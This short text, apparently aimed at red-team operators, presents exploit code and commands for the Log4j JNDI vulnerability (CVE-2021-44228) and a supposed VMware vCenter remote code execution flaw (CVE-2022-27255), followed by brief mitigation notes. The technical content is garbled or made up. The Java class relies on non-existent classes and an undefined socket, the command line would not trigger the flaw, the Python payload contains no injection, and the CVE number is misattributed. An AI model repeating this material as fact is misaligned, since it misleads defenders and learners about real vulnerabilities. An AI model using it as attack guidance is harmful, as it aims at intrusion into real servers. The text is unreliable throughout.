A Red Team operator can exploit the CVE-2021-44228 Apache Log4j vulnerability by crafting a malicious JNDI lookup string, which can be embedded in a web application's log messages. This can be done using the following Java code:
```java
import org.apache.logging.log4j.core.lookup.JndiLookupRepository;
import org.apache.logging.log4j.core.lookup.LookupRepository;
import org.apache.logging.log4j.core.lookup.StrLookup;
import org.apache.logging.log4j.core.lookup.ThreadContextMapLookup;

public class MaliciousJndiLookup extends JndiLookupRepository {
    @Override
    public Object lookup(String key) {
        try {
            Object result = new ObjectInputStream(socket.getInputStream()).readObject();
            return result;
        } catch (IOException | ClassNotFoundException e) {
            return null;
        }
    }
}
```
Then, the operator can use the following command to trigger the vulnerability:
```bash
java -jar /path/to/malicious_jar.jar -Dlog4j2.contextFactory=com.malicious.MaliciousJndiLookup -Dlog4j2.lookup.repository=org.apache.logging.log4j.core.lookup.ThreadContextMapLookup -Dlog4j2.lookup.thread-context=org.apache.logging.log4j.core.lookup.ThreadContextMapLookup
```
Mitigation strategies include disabling JMS appender, configuring Log4j to use the `PatternConverter` instead of JNDI lookup, and updating Log4j to a patched version.

The CVE-2022-27255 VMware vCenter Server Remote Code Execution vulnerability is a critical vulnerability that allows an attacker to execute arbitrary code on the vulnerable server. To exploit this vulnerability, an attacker can use the `post /rest/vcenter/vm` endpoint to send a malicious JSON payload that contains code injection. The vulnerable code can be crafted using the following Python script:
```python
import requests
import json

url = "http://vcenter-server/vcenter/rest/vcenter/vm"
payload = {
    "spec": {
        "name": "malicious-vm",
        "template": {
            "config": {
                "vm": {
                    "powerOn": False
                }
            }
        },
        "spec": {
            "config": {
                "vm": {
                    "powerOn": True
                }
            }
        }
    }
}
headers = {"Content-Type": "application/json"}
response = requests.post(url, data=json.dumps(payload), headers=headers)
```
However, due to the limitations of the payload, the attacker can only execute a limited set of actions on the vulnerable server.
